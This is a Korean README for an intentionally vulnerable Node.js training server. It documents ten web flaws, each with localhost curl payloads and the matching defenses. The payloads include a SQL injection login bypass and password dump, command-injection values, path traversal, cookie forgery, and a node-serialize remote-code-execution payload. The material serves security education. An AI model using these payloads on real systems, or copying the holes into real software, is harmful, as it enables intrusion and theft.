# 🔒 보안 취약점 학습 서버

⚠️ **경고: 이 프로젝트는 교육 목적으로만 사용됩니다!**

실제 프로덕션 환경에서는 절대 이러한 취약점을 포함해서는 안 됩니다. 이 서버는 보안 취약점을 이해하고 학습하기 위한 교육용 도구입니다.

## 📋 프로젝트 개요

이 프로젝트는 일반적인 웹 애플리케이션 보안 취약점들을 실습할 수 있는 학습용 서버입니다. OWASP Top 10을 포함한 다양한 보안 취약점을 직접 테스트하고 이해할 수 있습니다.

## 🚀 시작하기

### 설치

```bash
npm install
```

### 서버 실행

```bash
npm start
```

서버가 실행되면 다음 주소로 접속할 수 있습니다:
- 메인 페이지: http://localhost:3000
- Swagger API 문서: http://localhost:3000/api-docs

## 🎯 포함된 취약점

### 1. SQL Injection
사용자 입력을 검증 없이 SQL 쿼리에 직접 삽입하는 취약점

**엔드포인트:**
- `POST /api/vulnerable/login` - 취약한 로그인
- `GET /api/vulnerable/search?query=` - 사용자 검색

**테스트 예제:**
```bash
# 로그인 우회
curl -X POST http://localhost:3000/api/vulnerable/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\'' OR '\''1'\''='\''1", "password": "anything"}'

# 데이터 유출
curl "http://localhost:3000/api/vulnerable/search?query=%27%20UNION%20SELECT%20id,%20password,%20secret_token%20FROM%20users--"
```

**방어 방법:**
- Prepared Statements (Parameterized Queries) 사용
- ORM 라이브러리 활용
- 입력 검증 및 이스케이핑

### 2. XSS (Cross-Site Scripting)
사용자 입력을 필터링 없이 HTML에 출력하는 취약점

**엔드포인트:**
- `GET /api/vulnerable/comment?text=`

**테스트 예제:**
```bash
# 브라우저에서 접속
http://localhost:3000/api/vulnerable/comment?text=<script>alert('XSS')</script>
```

**방어 방법:**
- 출력 인코딩 (HTML Entity Encoding)
- Content Security Policy (CSP) 헤더 사용
- DOMPurify 같은 라이브러리로 입력 정제

### 3. Command Injection
사용자 입력을 시스템 명령어에 직접 사용하는 취약점

**엔드포인트:**
- `GET /api/vulnerable/ping?host=`

**테스트 예제:**
```bash
# 명령어 실행
curl "http://localhost:3000/api/vulnerable/ping?host=127.0.0.1;%20ls"
curl "http://localhost:3000/api/vulnerable/ping?host=127.0.0.1%20%26%26%20whoami"
```

**방어 방법:**
- 사용자 입력으로 시스템 명령어 실행 금지
- 입력 검증 및 화이트리스트 사용
- 안전한 라이브러리 활용

### 4. Path Traversal
파일 경로 검증 없이 파일 시스템에 접근하는 취약점

**엔드포인트:**
- `GET /api/vulnerable/file?filename=`

**테스트 예제:**
```bash
# 서버 코드 읽기
curl "http://localhost:3000/api/vulnerable/file?filename=../server.js"

# package.json 읽기
curl "http://localhost:3000/api/vulnerable/file?filename=../../package.json"
```

**방어 방법:**
- 파일 경로 정규화 및 검증
- 화이트리스트 기반 접근 제어
- 절대 경로 사용 및 경로 이탈 방지

### 5. IDOR (Insecure Direct Object Reference)
권한 검증 없이 객체에 직접 접근하는 취약점

**엔드포인트:**
- `GET /api/vulnerable/user/:id`

**테스트 예제:**
```bash
# 다른 사용자의 정보 조회 (비밀번호 포함)
curl http://localhost:3000/api/vulnerable/user/1
curl http://localhost:3000/api/vulnerable/user/2
```

**방어 방법:**
- 접근 권한 검증
- 세션 기반 권한 확인
- 간접 참조 사용 (UUID 등)

### 6. 약한 인증 (Weak Authentication)
클라이언트 측에서 조작 가능한 인증 메커니즘

**엔드포인트:**
- `POST /api/vulnerable/auth/login`
- `GET /api/vulnerable/auth/profile`

**테스트 예제:**
```bash
# 로그인
curl -X POST http://localhost:3000/api/vulnerable/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "user1"}' \
  -c cookies.txt

# 쿠키 조작하여 권한 상승
curl http://localhost:3000/api/vulnerable/auth/profile \
  -b "user=admin; role=admin"
```

**방어 방법:**
- JWT 같은 서명된 토큰 사용
- 서버 측 세션 관리
- HttpOnly, Secure 쿠키 플래그 사용

### 7. 민감한 정보 노출 (Sensitive Data Exposure)
디버그 정보나 설정 정보가 외부에 노출되는 취약점

**엔드포인트:**
- `GET /api/vulnerable/debug`

**테스트 예제:**
```bash
curl http://localhost:3000/api/vulnerable/debug
```

**방어 방법:**
- 프로덕션 환경에서 디버그 모드 비활성화
- 환경 변수로 민감한 정보 관리
- 에러 메시지 최소화

### 8. SSRF (Server-Side Request Forgery)
서버가 공격자가 지정한 URL로 요청을 보내는 취약점

**엔드포인트:**
- `GET /api/vulnerable/proxy?url=`

**테스트 예제:**
```bash
# 내부 엔드포인트 접근
curl "http://localhost:3000/api/vulnerable/proxy?url=http://localhost:3000/api/vulnerable/debug"

# 외부 URL 접근
curl "http://localhost:3000/api/vulnerable/proxy?url=http://example.com"
```

**방어 방법:**
- URL 화이트리스트 사용
- 내부 IP 대역 차단
- 네트워크 세그멘테이션

### 9. Mass Assignment
모든 필드를 무조건 업데이트할 수 있는 취약점

**엔드포인트:**
- `PUT /api/vulnerable/update-profile?userId=1`

**테스트 예제:**
```bash
# 권한 필드 변조
curl -X PUT "http://localhost:3000/api/vulnerable/update-profile?userId=1" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin", "secret_token": "my_hacked_token"}'
```

**방어 방법:**
- 필드 화이트리스트 사용
- 민감한 필드 업데이트 금지
- DTO (Data Transfer Object) 패턴 사용

### 10. Insecure Deserialization
신뢰할 수 없는 데이터를 역직렬화하여 원격 코드 실행이 가능한 취약점

**엔드포인트:**
- `POST /api/vulnerable/deserialize`

**테스트 예제:**
```bash
# 원격 코드 실행 (RCE) 페이로드
# 서버의 /tmp 디렉토리에 'pwned' 파일 생성
curl -X POST http://localhost:3000/api/vulnerable/deserialize \
  -H "Content-Type: application/json" \
  -d '{"data": "{\\"username\\":\\"pwned\\",\\"_is_serialized\\":true,\\"payload\\":\\"_$$ND_FUNC$$_function(){require(\'child_process\').execSync(\'touch /tmp/pwned\')}()\\"}"}'
```

**방어 방법:**
- 신뢰할 수 없는 소스의 데이터는 역직렬화하지 않음
- JSON과 같이 더 안전하고 표준적인 데이터 교환 포맷 사용
- 역직렬화 시 데이터 무결성 검증 (예: 서명 확인)

## 📚 학습 가이드

### 1. 각 취약점 이해하기
- Swagger 문서(/api-docs)를 통해 각 엔드포인트 확인
- 메인 페이지에서 각 취약점에 대한 설명 읽기

### 2. 취약점 테스트
- curl, Postman, 또는 브라우저를 사용하여 각 엔드포인트 테스트
- 제공된 예제 페이로드 시도
- 응답에서 취약점이 어떻게 악용되는지 확인

### 3. 방어 기법 학습
- 각 취약점에 대한 방어 방법 이해
- 실제 코드에서 어떻게 수정해야 하는지 고민
- 보안 라이브러리 및 프레임워크 기능 활용

## 🛠️ 기술 스택

- Node.js & Express
- SQLite (in-memory database)
- Swagger UI Express
- Cookie Parser
- node-serialize

## 📖 추천 학습 자료

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTheBox](https://www.hackthebox.com/)

## ⚠️ 법적 고지

이 도구는 교육 목적으로만 사용되어야 합니다. 다음 사항을 준수하세요:

1. 자신이 소유하거나 명시적 허가를 받은 시스템에서만 사용
2. 무단으로 타인의 시스템에 접근하지 말 것
3. 학습한 기술을 불법적인 목적으로 사용하지 말 것
4. 모의 침투 테스트는 반드시 승인 받은 후 진행

## 📝 라이선스

MIT License

## 🤝 기여

교육 목적의 프로젝트이므로 새로운 취약점 예제나 개선 사항에 대한 기여를 환영합니다.

---

**면책 조항:** 이 프로젝트의 개발자는 이 도구의 오용으로 인한 어떠한 손해에 대해서도 책임지지 않습니다. 사용자는 자신의 행동에 대한 전적인 책임을 집니다.